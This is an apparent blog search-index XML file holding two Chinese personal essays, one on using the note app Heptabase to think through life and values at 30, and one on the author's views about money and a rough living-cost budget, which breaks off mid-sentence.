<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>用 Heptabase 思考人生問題與一篇寫了一年還寫不完的文章</title>
      <link href="/2025/01/03/heptabase-and-life/"/>
      <url>/2025/01/03/heptabase-and-life/</url>
      
        <content type="html"><![CDATA[<p>事情是這樣的，<a href="https://life.huli.tw/2024/09/23/being-29/">《持續搖擺的 29 歲》</a>是一篇我原本打算發表於 30 歲生日，但卻遲遲沒有完成的文章。從開始寫到現在，已經過了快一年了，而我也已經 30.9 歲。之所以沒有完成，是因為裡面所談的問題，我自己還沒有一個答案，甚至連問題本身也沒有整理清楚，在這種狀態下，我不想發表，想等我自己至少有個階段性結論之後再來做這件事。</p><p>之前剛好有朋友來東京找我吃飯，在聊天的時候有聊到這件事情，朋友就直接開了電腦用 Heptabase 示範可以用怎樣的方法去思考，當下滿有感覺的，從那天之後就不斷有想法慢慢出現，對於之前沒辦法回答的問題，也有了初步的結論。</p><p>因此，這篇就來寫一下我到底碰到什麼問題才會寫了快一年寫不完，以及 Heptabase 是什麼，我又是怎麼用它來幫助我思考人生問題的。</p><h2 id="四十才能不惑，那三十怎麼辦？"><a href="#四十才能不惑，那三十怎麼辦？" class="headerlink" title="四十才能不惑，那三十怎麼辦？"></a>四十才能不惑，那三十怎麼辦？</h2><p>30 歲會是什麼感覺呢？</p><p>2015 年我剛踏入職場的時候，是 21 歲，成為了全公司正職員工裡面年紀最小的人，因為同年齡的人都還在念大三。那時的我完全沒辦法想像自己變成 30 歲的樣子，會跟差不多年齡的同事一樣，做人處事都更成熟嗎？會跟現在的稚嫩差很多嗎？</p><p>雖然說沒有人這樣規定，但是每五年或十年，我都會覺得自己應該要有什麼突破，或至少是新的體悟，20 歲是如此，25 歲或最近剛過的 30 歲也是如此。而 30 歲代表的意義又不太一樣，還不到會被稱之為中年人的 40 歲，又沒有 20 歲這麼青澀，這就是 30 歲的特別之處。從 20 歲到 30 歲，這出社會的十年間，會對自己有些期許，希望到 30 歲的時候能夠找到信奉一輩子的價值觀，就算之後會改變也沒關係，至少在那一刻，我是自洽的，我是獨立的。</p><p>但這在我身上並沒有發生，至少還沒有。</p><p>29 歲的我已經察覺到了這件事情，所以開始寫了開頭講的那篇《持續搖擺的 29 歲》，想說就算沒辦法解決問題，至少把問題寫清楚、記下來，對於整理想法也會很有幫助（不過最理想的當然是邊寫文章邊思考，寫完就想完了），結果文章寫不完，問題也想不清楚，就這樣到了 30 歲。甚至原本打算 2024 就要發的文章，也拖到了 2025。</p><p>那困擾我的問題到底是什麼？先從範疇最大的開始好了。</p><p>「我想成為什麼樣的人？我這輩子想做什麼樣的事情？」</p><p>25 歲的我，在<a href="https://life.huli.tw/2020/02/05/its-okay-if-you-dont-have-goal-35363a8d8266/">《沒有目標也沒有關係》</a>這篇文章中給了類似的問題「你的人生規劃是什麼？」一個答案：「我不知道，我沒有目標，沒有規劃，但我覺得這樣沒關係」。</p><p>事實上，我現在也這樣想。</p><p>但是「人生規劃」跟「想成為怎樣的人」看起來雖然有點類似，其實是兩件事情，我可以想成為一個善良的人，或是想成為一個財富自由的人，但是沒有具體的人生規劃，這兩件事情是不衝突的。</p><p>人生規劃更像是一種達成目的的手段，而「想成為怎樣的人」就是那個目的。</p><p>之所以會想在 30 歲以前搞清楚這個問題，是因為在 25 到 30 歲這段期間，我對自己的人生價值觀有了更多的疑惑，如同我在《持續搖擺的 29 歲》中所提到的：</p><ol><li>對金錢的看法，我認為自己沒這麼在意錢，但為什麼我看到其他人賺大錢我會羨慕？是不是我其實很在意？該怎麼解釋這個行為？</li><li>我不喜歡「不純的動機」，這是為什麼？我的理論站得住腳嗎？有沒有除了「我不喜歡」之外的合理解釋，是可以說服別人「你也應該不喜歡」的？沒有的話，那我該怎麼辦？接受我就是個雞掰人嗎？</li><li>假設 AB 手段都可以達成目標，B 快很多但是會違背原則，有沒有一個理論可以說服我自己 A 或 B 一定是對的？我目前邏輯推理出來是偏向 B，但我還是想選 A，我該如何解釋這種不一致？</li></ol><p>對我來說，這些問題已經到了「不解決會很不舒服」的程度了，所以我才想趕快想清楚，就算答案是「我就是搞不清楚」也好，無論如何，我都需要一個答案。</p><p>但文章會寫這麼久，就是因為我還沒找到答案，也不知道自己什麼時候會找到。</p><h2 id="新的刺激與新的想法"><a href="#新的刺激與新的想法" class="headerlink" title="新的刺激與新的想法"></a>新的刺激與新的想法</h2><p>那篇文章就這樣躺在我的 HackMD 裡面，偶爾有靈感的時候補一些內容上去，但大部分時候都處於閒置狀態，要用叮咚功能才能喚醒的那種。</p><p>直到 6 月初的時候，剛好有個朋友來東京玩，問我要不要吃個飯，才在那個晚上讓整件事情有了進展。話說跟我吃飯的對象，大部分都是只見過一兩次，或根本沒見過的朋友，其實更像是網友，可能網路上稍微聊過或是在社群媒體上交流過而已。大多數時候我都滿喜歡這件事的，有時候認識新的朋友可以帶來一些新的刺激。</p><p>在飯局上聊了一下最近的工作，聊著聊著就問我最近的規劃是什麼，我就說了最近還處於迷惘的階段，還在找尋下一步該怎麼辦，然後也提到了我有篇寫了一年還寫不完的文章，大概講了一下大意。</p><p>那位朋友剛好前陣子對「找尋人生終極目標」這件事情有些研究，花了不少時間讓自己變得自洽，也看了很多方法論，因此就直接拿起筆電跟我分享他是怎麼做的，以及我可以試試看怎麼做。</p><p>舉例來說，如果不知道自己想做什麼，就先從自己目前正在做或是已經做過的事情開始，去找尋共同性，先知道自己喜歡什麼或不喜歡什麼，不斷問問題，拓展然後收斂想法。在選擇的情境之下，也可以用量化分析的方式去思考，算出一個實際的值，就會變得更明確。</p><p>而他拿來 demo 的軟體是 Heptabase，根據<a href="https://wiki.heptabase.com/getting-started-with-heptabase?lang=zh-Hant">它自己的維基定義</a>，Heptabase 是一個專門幫助你學習和研究複雜主題、對事物建立深度理解的視覺化筆記軟體。</p><p>什麼是「視覺化筆記軟體」？像是 HackMD 或我唯一有用的 Evernote，都是以文字為主的形式，介面大概像這樣：</p><p><img src="/img/heptabase-and-life/p1.png" alt="Evernote 截圖"></p><p>筆記軟體嘛，很多都長這樣，就是一篇篇的筆記，沒什麼特別的。</p><p>而 Heptabase 其實對我來說，更像是一個你可以視覺化整理想法的地方，你會有一個無限大的白板，可以在上面放很多卡片，就像是在參加 Design Thinking 的工作坊時，會貼很多便條紙那樣，例如說這是我的資安筆記：</p><p><img src="/img/heptabase-and-life/p2.png" alt="資安筆記"></p><p>其實我知道這個軟體很久了，但一直沒有使用，至於原因的話之後會再寫一篇文章，這邊就不多談。</p><p>總之呢，當天跟朋友聊完之後，其實有各種想法慢慢出現，過了幾天以後我就買了 Heptabase，開了一個白版，叫做「思考人生」，接著放了第一張卡片：</p><p><img src="/img/heptabase-and-life/p3.png" alt="思考人生卡片"></p><p>接下來的幾天，我從這張核心卡片延伸出了很多想法。</p><p>與此同時，我也趕緊把《持續搖擺的 29 歲》這篇文章做了個結尾，至少先把問題整理清楚，而底下的內容會與這篇文章高度相關，因此建議先看過那篇文章再繼續往下看。</p><p>傳送門：<a href="https://life.huli.tw/2024/09/23/being-29/">https://life.huli.tw/2024/09/23/being-29/</a></p><p>這篇文章，就是在寫我怎麼靠著 Heptabase 這個工具，回答出底下幾個我思考已久的問題：</p><ol><li>對金錢的看法，我認為自己沒這麼在意錢，但為什麼我看到其他人賺大錢我會羨慕？是不是我其實很在意？該怎麼解釋這個行為？</li><li>我不喜歡「不純的動機」，這是為什麼？我的理論站得住腳嗎？有沒有除了「我不喜歡」之外的合理解釋，是可以說服別人「你也應該不喜歡」的？沒有的話，那我該怎麼辦？接受我就是個雞掰人嗎？</li><li>假設 AB 手段都可以達成目標，B 快很多但是會違背原則，有沒有一個理論可以說服我自己 A 或 B 一定是對的？我目前邏輯推理出來是偏向 B，但我還是想選 A，我該如何解釋這種不一致？</li><li>我想成為怎樣的人，想做什麼？</li></ol><h2 id="我怎麼用-Heptabase-思考人生問題？"><a href="#我怎麼用-Heptabase-思考人生問題？" class="headerlink" title="我怎麼用 Heptabase 思考人生問題？"></a>我怎麼用 Heptabase 思考人生問題？</h2><p>先寫在前面，我不認為在思考人生這個問題上 Heptabase 是必備的，在我所思考的過程中，其實你有個白板跟便條紙也做得到，或甚至是文字的形式或許也可以。但我認為 Heptabase 的使用跟我原本在想東西的方式滿契合的，都是從一個點不斷延伸出其他概念並且收斂。平常寫技術文章的時候，這些東西是放在我腦中的，整理完畢之後寫文章就可以快速寫完。</p><p>但像是這種寫了一年還不寫完的文章，就代表思考過程緩慢，所以一定要找個地方記起來，否則記憶會被洗掉。因此把這些思考過程放在 Heptabase 上，可以幫助我迅速找回記憶，也能夠一眼看出思考問題的過程，最後整理成文章也會很方便。</p><p>在這個層面上，我的使用方式與大眾所認知的「筆記軟體」是有所不同的，很多人的筆記是思考過後的總結，是整理後的結論，而我則是把思考的過程記錄下來，當作輔助思考的工具。</p><p>所以與其把 Heptabase 想成是個筆記軟體，不如想成它就是有個寬闊畫布的白板，你想在上面放什麼都行，想用成像是 Evernote 那種一篇一篇的筆記也可以，想像我這樣拿來把腦中的想法具現化成便利貼也可以。</p><p>總之呢，如同剛剛所講的，我開了一個白板，上面放了一張「想追求的目標是什麼？」當作中心。</p><p>接著我從這張卡片延伸出三個想法：</p><ol><li>為什麼一定要有想追求的目標？（對於問題本身的質疑）</li><li>我想做哪些事情？（目標的範疇有點太大，先從小的開始）</li><li>我喜歡以及討厭哪些事情？（先從已發生的事件來找線索）</li></ol><p>接著就是文字與圖像的不同了，如果是文字的話我只能有一維的線性排列，例如說把每個想法變成一個大標題，底下其他探索過程再用條列式記錄下來，但圖像式的筆記可以用二維的方式，讓呈現出來的結果更貼近思考過程，這三個是平行發展的：</p><p><img src="/img/heptabase-and-life/p4.png" alt="平行發展的卡片"></p><p>我的使用方式是在標題寫上最核心的問題，內文寫一些針對這題的想法，比如說「為什麼一定要有想追求的目標？」，這是我列出來的延伸問題，因為有時候我們太習慣去尋找答案，卻忘了先問這個答案是否有意義。</p><p>而我對這題的回答是：「似乎沒有這個必要性，就算沒有明確的目標也沒關係」，在回答完後，我自然而然得出下一個需要問的問題：「那如果沒有想追求的目標，為什麼要活著？」，於是我就再延伸出了下一張卡片，反映了我的思考過程：</p><p><img src="/img/heptabase-and-life/p5.png" alt="思考過程"></p><p>我想了想，覺得沒有一定要活著才行，但同時也沒有不想活的理由，那既然是這樣的話，就等於會繼續維持目前活著的狀態，那下一個該問的問題就是要活成什麼樣子。</p><p>最後我給了一個似乎很常見而且很籠統的答案，「活得快樂就好」，我依稀記得以前修倫理學的時候好像也有討論過類似的問題，但我忘光光了。雖然說現在收斂想法以後，我的思考看起來很連貫，但實際上在思考這些問題時，間隔時間是以天來計算的。</p><p>也就是說，我思考到「既然快樂就好，那怎麼會快樂？」這題的時候，可能花個一兩天才能得出滿意的答案，才會接著建立下一張卡。</p><p>而在這個問題上，我得到了一個體悟。</p><p>那就是我問錯了問題，如果問「怎樣才會快樂」的話，是得不出答案的。住豪宅快不快樂？搭頭等艙快不快樂？這些都很快樂，但不一定是我真的想追求的。如果這樣問的話，就會發現每一件事情都很快樂，就很難判斷什麼才是真正重要的。</p><p>因此我認為要反過來問：「怎樣會不快樂？」，這時候又可以從生命經驗下手，去回想以前讓自己不快樂的事。</p><p>我列出了三個會讓我不快樂的事情：</p><p><img src="/img/heptabase-and-life/p6.png" alt="不快樂的事情"></p><ol><li>沒有自由會不快樂（例如說當兵）</li><li>需要擔心日常生活的金錢會不快樂（柴米油鹽醬醋茶）</li><li>沒辦法旅遊會不快樂</li></ol><p>列完這幾點後，我發現一件事情，那就是這裡面並沒有「沒有達成財富自由會讓我不快樂」這件事情，第一點的自由專指的是「人身自由」，並沒有包含財富自由。</p><p>因此，我得到了一個結論，那就是在這個人人追求財富自由，希望能早點不工作的時代中，就算沒有刻意追求財富自由，我也不會不快樂。</p><p>這就解釋了我在之前的文章中提的第一個問題：「對金錢的看法，我認為自己沒這麼在意錢，但為什麼我看到其他人賺大錢我會羨慕？是不是我其實很在意？該怎麼解釋這個行為？」</p><p>看到其他人賺錢會羨慕，是因為如果我也賺了錢，會讓我快樂，因此這是正常的，但這不代表是我想要的。換句話說，就是做某件事 A 會讓我快樂，不代表 A 是可欲的（desirable）。</p><p>這邊會突然用了一個好像很專業的名詞，是因為我想起來以前似乎學過這個，拿來賣弄一下。我查了一下，這可能貼近哲學家 John Stuart Mill 的想法中 Higher and lower pleasures 的概念，不過誠如我剛剛所說，我在哲學系裡學的知識早已忘光，因此就當我講的都是錯的好了，看過就忘掉吧。</p><p>話說我在思考這問題的時候，剛好看到了 leafwind 所寫的<a href="https://leafwind.tw/2024/04/05/formulaic-solutions-killed-the-interest/">《公式殺死了興趣》</a>，引用裡面一段話：</p><blockquote><p>但我覺得多數台灣人並非真的打從心底喜歡賺錢，只是被焦慮感培養出想要賺錢的慣性。</p></blockquote><p>我想，我也是比較貼近這樣吧，當周遭朋友跟各種論壇以及社群網站上每個人都在談論賺錢的時候，就會有一種「那我也要跟上」的焦慮感。</p><p>讓我們再回到核心問題上，既然有三個東西會讓我不快樂，那要怎樣才能避免這三件事情的發生？當兵那個沒有簽下去的話，基本上不會發生，所以先不管。另外兩個都跟金錢有關，而我目前的生活品質其實就是「不快樂」的反面，意思是我不用擔心日常開銷，也可以偶爾旅遊幾次。</p><p>因此，下一個問題很明顯了，就是「維持現在的生活品質，需要多少錢？」，算出來以後又可以繼續問「那想活到幾歲？存款可以撐多久？」，有了這些之後，就可以客觀算出必須工作到幾歲，又該怎麼制定理財計劃：</p><p><img src="/img/heptabase-and-life/p7.png" alt="理財計劃"></p><p>不過這邊需要大量計算，我現在還懶得算這個，所以就先在此打住了。而且我得到的收穫已經足夠了，我知道我焦慮的原因，知道為什麼我會羨慕，也知道羨慕與可欲是兩件獨立的事情。</p><p>而以上這些思考歷程，都可以很快速地透過白板上的卡片，視覺化地回顧一次：</p><p><img src="/img/heptabase-and-life/p8.png" alt="思考歷程回顧"></p><p>話說寫完上面這些之後大概過了一個月，我突然想到另一個延伸問題。那就是：「如果我不關心財富自由，我打算工作一輩子嗎？」，這是一個很現實但也很必須的問題。</p><p>雖然我前面已經講說自己「沒有財富自由，不會不快樂」，但那可能僅限於現在的時間點，如果再往後推 30 年呢？當我 60 歲的時候還需要繼續工作，我會不快樂嗎？</p><p>話又說回來，我這邊的「財富自由」的定義到底是什麼？有些人會先主張要討論財務自由跟財富自由的不同，但這邊先略過不同，統一用「財富自由」這個詞來表示 Financial Independence。</p><p>對於財富自由，有一種定義是「被動收入超過生活開支」，另一種是「到死之前都不用再工作」，還有一種是「有超級多錢」（這種會主張前兩種要被歸類到財務自由）。</p><p>以前玩什麼現金流遊戲的時候，是偏向第一種定義，要累積被動收入才能財富自由。但我自己比較想追求的更像是第二種，只要能夠不工作就可以生活，就算是一種財富自由。</p><p>而我 60 歲的時候，顯然是不想工作的，就代表其實長期來看，沒有財富自由，我會不開心。這也代表總有一天我會想退休，我會需要財富自由。</p><p>因此，我並不是不需要財富自由，而是我有「不需要刻意追求，也能達成財富自由」的自信。這邊可以繼續延伸之前講過的東西，算出生活花費，再算出需要多少薪水跟時間，就能讓整件事情變得非常科學，非常有理有據。</p><p>但我那股毫無來由的自信告訴我說不需要，不用算，我做得到。</p><p>總之呢，至少在金錢這一塊我找到了我要的答案，我確實沒這麼在乎錢。</p><h2 id="解決其他問題"><a href="#解決其他問題" class="headerlink" title="解決其他問題"></a>解決其他問題</h2><p>還剩三個問題要解決：</p><ol><li>我不喜歡「不純的動機」，這是為什麼？我的理論站得住腳嗎？有沒有除了「我不喜歡」之外的合理解釋，是可以說服別人「你也應該不喜歡」的？沒有的話，那我該怎麼辦？接受我就是個雞掰人嗎？</li><li>假設 AB 手段都可以達成目標，B 快很多但是會違背原則，有沒有一個理論可以說服我自己 A 或 B 一定是對的？我目前邏輯推理出來是偏向 B，但我還是想選 A，我該如何解釋這種不一致？</li><li>我想成為怎樣的人，想做什麼？</li></ol><p>接著就來一一擊破。</p><h2 id="討厭的事情"><a href="#討厭的事情" class="headerlink" title="討厭的事情"></a>討厭的事情</h2><p>為了更了解自己是個什麼樣的人，我在 Heptabase 上建立了一個區塊，叫做「討厭的事情」，並且開了三張卡片：</p><ol><li>討厭「不純的動機」</li><li>討厭浮誇的宣傳方式</li><li>討厭刻意做些什麼，討厭「經營」</li></ol><h3 id="不純的動機"><a href="#不純的動機" class="headerlink" title="不純的動機"></a>不純的動機</h3><p>第一點就是我在之前文章中提到的，在這邊簡單再講一遍。不純的動機指的是為了利益而做某件事情，這個利益不一定要是金錢，名氣也算是一種。</p><p>舉例來說，「為了想累積名氣開課賺錢，所以寫技術部落格」或者是「為了面試的時候可以說：『我有一直在分享』，所以寫技術部落格」對我來說都是不純的動機。</p><p>那純粹的動機是什麼？就是不為了這些利益，單純是因為「我喜歡分享」或是「我就是喜歡寫」為出發點開始的。要注意的是這邊談論的是動機而非結果，如果寫部落格寫到後面有了名氣或是有了業配，這都無所謂，不會破壞原本純粹的動機。</p><p>那為什麼我會討厭不純的動機呢？</p><p>我想了一下，如果這個動機跟程式無關，我其實是無所謂的。舉例來說如果有人為了想紅而寫歌，為了想紅拍 YouTube 搞笑影片，我都不會特別覺得怎樣，那這是為什麼？</p><p>我想應該是因為我是純粹且不求回報喜歡著這件事，所以才討厭不純粹的動機。就如同之前那篇所說的：</p><blockquote><p>如果是為了利益的話，動機就不純了。而我自己是屬於「分享即目的」的那派，或許這也是為什麼我會不喜歡不純的動機，有種「你褻瀆了我真心喜愛的事物」的感覺。</p></blockquote><p>這邊我在意的只有動機，做一件事情的出發點，而非其他理由。有幾個理由我都想過，但不符合我的狀況，包括：</p><ul><li>「就算動機不純，他們也付出時間在做這件事情」，我不在意</li><li>「就算動機不純，他們還是對這整個社群有貢獻」，這我也不在意</li><li>「你是不是嫉妒，他們可以這樣賺取利益而你不行」，這也不是，畢竟雖然我動機不同，但以結果來看我也賺取到利益了</li><li>「商業化才是長久之道，這樣是正常的，不能光靠熱血撐著」，這我能理解</li></ul><p>我想了各種狀況，你說的我都懂，我也都能認同，從開源社群就可以看出來想長久經營的話，利益是必須的，而有些人出發點雖然不純，但產生的結果確實對整體是正向的。</p><p>這些我都能理解，但問題是我還是覺得動機對我來說是重要的。</p><p>喔對了，另一個常見的論述是：「可是你怎麼知道對方動機是什麼？」，這不是我想討論的問題，這是實務上的問題，不影響我對「動機是否重要」這題的想法。</p><p>話說我有跟 ChatGPT 討論了一下這個問題，後來才發現這其實很倫理學，以前學過的倫理學其實就有類似的討論（但我已經忘光了），想看更多的話可以參考 <a href="https://corrupttheyouth.net/tradition/analytic/salt/6515/">道德能不免於運氣嗎？﹙一﹚談談「動機」與「道德」的關係</a>。</p><p>總之呢，我得出的結論是：</p><blockquote><p>我的討厭沒有道理，因此我不會對外張揚</p></blockquote><p>也就是說，我討厭不純的動機這點就是如此，儘管某件事對整體有正向利益，但我還是討厭，這代表我不在乎其他人或是整體社會的利益，只在乎我的。</p><p>因此，我找不到理由說服別人跟我一起討厭，這個討厭是只屬於我自己的東西。而我也不應該對外宣揚，因為這件事對其他人來說可能是有利的，所以不應該因為我自己沒有理由的討厭，而去干涉這件事情。</p><p>例如說假設有個部落格曾經寫過一篇文章說：「我主管說我能力不錯，但就是影響力不夠，可以試試看寫部落格，為了在公司升遷我就開始寫了」，這符合我說的動機不純，因此我不喜歡，但可能這部落格裡面的文章品質很不錯，很多人分享。</p><p>這時候我不會去公開展示我的討厭，不會像個酸民在那邊酸，只會把這件事情放在心裡，繼續我的討厭，但不干涉別人。這是我覺得最合適的做法了。</p><p>不過寫完上面這段之後過了兩三個月，我有了一個新的疑惑，雖然我寫說自己動機很純，但是是真的嗎？我一再提過我做教學的目的其實是為了我自己，我想證明自己教得不錯，並不是「因為我就是想要教學」，那這是不是也算一種動機不純？</p><p>如果算的話，代表我雙重標準了，我可以為了證明自己做教學，但是別人不能為了賺大錢開課。如果不算的話，我必須找到一種解釋，去說明兩者的不同點，去為自己辯護。其中一種可能的方式是，所謂的「自我滿足」並沒有從其他人那裡實質上獲得什麼，因此不算是「動機不純」，需要從其他人那裡獲得什麼才算。</p><p>這題我還沒有想得很清楚，現在也還沒有答案，因此就暫時在這邊打住吧。</p><h3 id="討厭浮誇的宣傳方式"><a href="#討厭浮誇的宣傳方式" class="headerlink" title="討厭浮誇的宣傳方式"></a>討厭浮誇的宣傳方式</h3><p>之所以會討厭這個，是因為這就等同於廣告不實，誇大療效，是一種欺騙的行為。</p><p>這一題暫時沒有其他更深入的想法。</p><h3 id="討厭刻意做些什麼，討厭「經營」"><a href="#討厭刻意做些什麼，討厭「經營」" class="headerlink" title="討厭刻意做些什麼，討厭「經營」"></a>討厭刻意做些什麼，討厭「經營」</h3><p>一樣從這個問題開始，我開了一張卡片，去思考為什麼我討厭刻意去做些什麼。</p><p>舉例來說，如果有兩種下標題的方式，一種是「讓你省錢的五大妙招」，另外一種是「我是怎麼省錢的」。就算前者流量比較好，看得人比較多，我可能也不會想這樣做，為什麼？</p><p>我得出了兩個答案：</p><ol><li>因為我在意「我想這樣做」</li><li>我想證明其他方式也可以</li></ol><p><img src="/img/heptabase-and-life/p9.png" alt="討厭刻意經營的卡片"></p><p>為什麼想證明其他方式也可以？因為看不慣每個人都一樣，這樣很無聊，不有趣，每篇文章都跟內容農場一樣，看久了真的很膩。</p><p>因此我真正討厭的可能是跟別人一樣，失去了自己的想法跟獨特性就不行。</p><p>我討厭的應該也不是某種方法本身，而是想要用自己的方式得到認可，證明「我文章流量好，是因為我想這樣做，不是因為聽別人這樣教」。</p><p>就算最後的結果一樣，也代表是我自己想出來的。</p><p>那為什麼想這樣？因為想證明我很厲害。</p><p>那為什麼想證明我很厲害？我得出了一個我之前從沒想過的結論：「我要是特別的」。</p><p>我不想跟其他人一樣，我希望我是特別的，因此才會討厭用跟別人相同的方式下標題，失去辨識度。</p><p>從「討厭刻意做些什麼」這個問題不斷思考，最後居然得出了這個看起來滿合理，但我從來沒想過的結論，確實滿有趣的。或許我真正希望的是自己看起來特別，因為才會討厭刻意去做些什麼，討厭跟別人一樣。</p><h2 id="話又說回來，這些真的這麼重要嗎？"><a href="#話又說回來，這些真的這麼重要嗎？" class="headerlink" title="話又說回來，這些真的這麼重要嗎？"></a>話又說回來，這些真的這麼重要嗎？</h2><p>上面這些內容都是在 2024 年 6 月左右寫的，有一兩週特別有靈感跟動力，每天都在思考這些問題，但接著工作跟生活都陸續有更多事情變得越來越忙，就把另外兩題「目的與手段的選擇」以及「想成為怎樣的人」放一邊了。</p><p>因此，這兩題目前是還沒有答案的。</p><p>而拖延的這半年也讓我開始思考一個問題：「既然都拖半年沒思考了，是不是代表這些其實也沒這麼重要？」，前面有提到會想要思考這些問題，是因為如果沒有找到答案，我會很不舒服，但半年後再回頭看，其實好像也還好。</p><p>無論如何，我滿享受這個思考的過程，而且確實有讓我激發不同的想法，得出了自己從未想過的結論（而且是合理的）。從這篇文章的思考脈絡跟得出的一些結論看來，或許我這個人比自己想像中還要自負、固執而且天真。</p><p>儘管只思考到一半而已，還有一些東西沒有思考完整，依然不能說我找到了答案，但是這篇已經從 2024 年中拖到 2025 了，我覺得再繼續放著似乎也不會有更多進度，因此就先在這邊打住吧。剩下那兩題或是有些沒思考清楚的部分，或許有天我會找到答案，也或許不會有這麼一天。</p>]]></content>
      
      
      <categories>
          
          <category> 思考人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>持續搖擺的 29 歲</title>
      <link href="/2024/09/23/being-29/"/>
      <url>/2024/09/23/being-29/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/being-29/p1.jpg" alt="cover photo"></p><p>（這張橫濱的圖片拍攝於 2023 年 12 月，我還在 29 歲的時候，但與文章內容沒什麼關係）</p><p>其實原本打算在 30 歲生日的時候寫篇文章整理並分享一下自己的近況，至於為什麼要這麼做，純粹是為了個人喜好。</p><p>在看其他人的部落格時，我最有興趣的頁面是「關於我」，想知道他在哪裡工作，職業是什麼，信奉哪些價值觀，平常又有什麼興趣（像是 <a href="https://leafwind.tw/about/">https://leafwind.tw/about/</a> 或 <a href="https://me.kalan.dev/">https://me.kalan.dev/</a> ），喜歡看也喜歡寫，我本來就喜歡把生活中在思考的事情記錄下來。</p><p>而 2023 年底的時候看到一堆人開始寫年度回顧，想說那就順便把原本想寫的全部塞進一篇文章裡面好了（最喜歡的年度回顧是 Parker 的這篇：<a href="https://www.parkerchang.life/life/2023-2024">2023 → 2024</a>）。</p><p>這篇會提到的東西，其實幾年前就提過了，如果有興趣的話，可以先看看以前寫過的這幾篇，看這篇會更有感覺：</p><ol><li><a href="https://life.huli.tw/2019/11/14/someday-i-will-a5aede6d30e2/">或許有天，我會歸隱山林</a>，寫於 2019 年 11 月</li><li><a href="https://life.huli.tw/2021/10/29/wannabe-f24dca839d27/">想變成的模樣</a>，寫於 2021 年 10 月</li><li><a href="https://life.huli.tw/2022/12/18/you-live-too-comfortably-de6b51fa9875/">你過得太安逸了</a>，寫於 2022 年 12 月</li></ol><h2 id="錢錢錢，到底多少才夠用？"><a href="#錢錢錢，到底多少才夠用？" class="headerlink" title="錢錢錢，到底多少才夠用？"></a>錢錢錢，到底多少才夠用？</h2><p>其實開頭貼的那三篇，有部分的內容都在談同一件事：金錢觀。</p><p>比如說在 2019 年年底寫的第一篇裡面，我是這樣寫的：</p><blockquote><p>我原本以為我已經滿「出世」的了，而且脫離了滿多人的那種「單一成功價值觀」，例如說薪水高就是比較厲害，當醫生就是比種田好。</p><p>但當我仔細想想之後，才發現自己好像沒有脫離這種我不喜歡的思維，因為我仍然在追求更高的薪水，更好的公司，暗自覺得這樣比較「成功」，這樣能夠證明自己比較厲害。</p><p>可是一旦有了這種競爭思維，會發現這是永無止盡的，這是永遠都走不完的一條路。想到這邊就覺得好絕望喔，為什麼我要卡在一個我不想待的無窮迴圈裡面，我不想這樣。</p></blockquote><p>到了第二篇 2021 年底的時候，也大概可以看出我對金錢其實沒什麼追求：</p><blockquote><p>如果財富可以到每次出國都頭等艙，台灣各縣市都有豪宅，各種高級禮遇，金錢能搞定的問題都不是問題，這樣好嗎？當然好，怎麼可能不好。但要達成這個目標，勢必是要付出相等的努力，那我願意付出那些努力嗎？</p><p>不願意，我好懶。</p><p>對我這種懶人來說，比起花力氣去思考怎麼賺更多的錢，降低物慾還比較實在。現在的生活環境對我來說就已經可以了，偶爾買買特價的商務艙已經是生活中的小確幸，可以帶來足夠的快樂，沒什麼不好的。</p><p>而我其實也沒想過財富自由這件事情，我也沒想過有什麼退休生活。對我來說，目前為止我都還是快樂地工作，做著自己想做的事情。哪天真的不工作了，可能一時之間我也不知道要幹嘛。換句話說，我覺得工作對我來說就是一種生活，就是一種休閒娛樂（這代表我是一個工作狂嗎？我覺得不是）。</p></blockquote><p>又過了一年，到 2022 年底的時候，想法其實還是沒有改變：</p><blockquote><p>四五年前我剛出社會的時候，年薪 50 萬，比起那些動不動就百萬年薪的鄉民低多了。後來變成 70，再來變成 130，然後慢慢越漲越高，卻還是能在各個版上看到更高的數字。</p><p>那是不是代表這一條路是永無止盡的？就算進了 Google 或是 Meta 這種令人欽羨的公司，你還是會羨慕著比你更高階的人。你拿 200 也好，400 也好，當你到了那個等級，總是會認識一些更高的，比你賺更多錢的，讓你覺得自己好像還不夠，還有努力空間。</p><p>「永遠都不夠」這件事，往好處想可以是「我可以一直進步」，往另一面想就是「我到什麼時候才能停下來？」。</p><p>意識到這件事情是多麽空虛以後，我不禁想說一聲「我不想努力了」，我想停在這邊就好，拿一個不會餓死的薪水，就這樣停在這個階段，不是也滿好的嗎？</p></blockquote><p>我自認對於金錢並沒有太大的執著，不會為了追求更多的金錢而付出更多的努力。同事在討論什麼理財投資的話題時，我幾乎沒什麼興趣，我對賺錢這件事情的興趣，遠比同溫層會碰見的人還來得低，而且是低很多。</p><p>但這是為什麼呢？</p><p>我想了一下，這背後的原因可能異常簡單——我認為就算自己不刻意努力賺錢，依然可以獲得一個生活品質不錯的薪水，因此在「錢夠用就好」的前提之下，沒有必要刻意去賺更多錢。</p><p>這個薪水是多少？大概是 120~150 萬台幣吧，就先假設我可以穩定獲得這個範圍內的薪水好了，我認為這個薪水可以讓我過得滿舒服的。</p><p>可以簡單計算一下，如果是 120 萬好了，支出的話大概是：</p><ol><li>所得稅 6 萬</li><li>房租或房貸一個月 2 萬，共 24 萬</li><li>一個月生活費（餐費交通費加各種雜支）也算 2 萬，共 24 萬</li><li>水電瓦斯電信費管理費網路費算一個月 5000 好了，共 6 萬</li><li>孝親費一個月 1 萬，共 12 萬</li><li>一年出國四次，一次算 5 萬，共 20 萬</li></ol><p>花費總共 92 萬，可以存 28 萬，大約是年薪的 25% 左右。上面的數字都是隨意抓的，應該相去不遠？就算考慮進去保險再多個幾萬塊好了，也還是有剩，可以存到錢。</p><p>話說我其實很不會估算花費，因為我不管怎麼估都覺得我現在的存款應該要多很多，但其實沒有，我也不知道錢都花到哪裡去了（我猜是旅遊吧）。因此，如果上面的估算有嚴重的低估，麻煩不吝指出，讓我修正一下。</p><p>我不騎車也不開車，基本上也不怎麼買衣服，生活中的休閒娛樂都是不用花錢的（寫部落格、看 YouTube、打 CTF 等等），不菸不酒也不玩遊戲，所以娛樂費真的很少，就只有出國而已。</p><p>我以前在新加坡的時候寫過一篇<a href="https://life.huli.tw/2018/10/14/singapore-expense-6f5caaf6dd75/">《撇除娛樂不談，在新加坡生活一個月要多少錢？》</a>，那時候有認真記帳，算出來一個月花費是 43000 台幣，再加上孝親費跟上面估算的出國費用，也差不多 80~90 